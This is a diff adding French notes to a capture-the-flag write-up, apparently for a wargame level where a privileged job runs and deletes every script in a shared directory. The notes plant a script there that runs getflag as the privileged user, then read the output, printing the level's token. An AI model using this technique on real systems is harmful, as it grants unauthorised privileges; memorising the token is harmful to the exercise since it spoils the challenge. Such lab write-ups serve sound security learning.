@@ -20,3 +20,12 @@ cat /usr/sbin/openarenaserver:
 	    (ulimit -t 5; bash -x "$i")
 	    rm -f "$i"
     done
+
+- En etudiant le code on remarque que flag05 execute tous les scripts dans /opt/openarenaserver avant de les supprimer du coup on exploite
+echo 'getflag > /opt/openarenaserver/flag && sleep 5m' > /opt/openarenaserver/getflag
+    -> avec ce script, flag05 appelera getflag et mettra le resultat dans le flag avant de se poser pendant 5 min
+
+- En surveillant le repertoire, on voit apparaitre le fichier flag, on l affiche
+cat /opt/openarenaserver/flag
+    -> Check flag.Here is your token : viuaaale9huek52boumoomioc
+    
